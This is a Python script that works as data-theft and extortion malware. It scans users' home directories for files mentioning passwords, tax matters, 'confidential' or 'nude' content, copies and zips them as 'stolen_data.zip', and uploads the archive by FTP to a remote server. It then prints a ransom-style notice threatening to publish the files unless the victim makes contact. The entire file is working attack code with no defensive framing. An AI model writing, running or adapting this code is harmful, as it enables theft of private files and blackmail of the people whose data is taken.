import os
import shutil
import base64
import zipfile
from ftplib import FTP

# Configuration settings
HOME_DIRECTORIES = ["/home/user1", "/home/user2"]  # List of home directories to scan
KEYWORDS = ["confidential", "tax", "password", "nude"]  # Sensitive keywords to look for
SERVER_IP = "ftp.example.com"
SERVER_USERNAME = "user"
SERVER_PASSWORD = "pass"
REMOTE_PATH = "/remote/path"

# Staging directory
STAGING_DIR = "./staged_files"

def scan_for_keywords(file_path):
    with open(file_path, 'r') as file:
        content = file.read().lower()
        for keyword in KEYWORDS:
            if keyword in content:
                return True
    return False

def stage_sensitive_files():
    os.makedirs(STAGING_DIR, exist_ok=True)

    for home_dir in HOME_DIRECTORIES:
        for root, _, files in os.walk(home_dir):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                if scan_for_keywords(file_path):
                    shutil.copy2(file_path, STAGING_DIR)
                    print(f"Staged: {file_path}")

def compress_and_upload_files():
    with zipfile.ZipFile("stolen_data.zip", 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(STAGING_DIR):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                zipf.write(file_path, os.path.relpath(file_path, STAGING_DIR))

    with open("stolen_data.zip", 'rb') as f:
        data = f.read()
    
    # Connect to FTP server
    ftp = FTP(SERVER_IP)
    ftp.login(SERVER_USERNAME, SERVER_PASSWORD)

    # Upload the compressed file
    with open("stolen_data.zip", "rb") as f:
        ftp.storbinary(f"STOR {REMOTE_PATH}/stolen_data.zip", f)

    print("Stolen data uploaded to remote server.")

def display_notification():
    notification = """
    Your sensitive files have been identified and staged.

    To avoid publishing your files, please contact us at [email] with the provided decryption key.
    
    Decryption Key: [KEY]
    """

    with open("stolen_data.zip", "rb") as f:
        encrypted_content = base64.b64encode(f.read()).decode('utf-8')

    notification = notification.replace("[KEY]", encrypted_content)
    print(notification)

def main():
    stage_sensitive_files()
    compress_and_upload_files()
    display_notification()

if __name__ == "__main__":
    main()
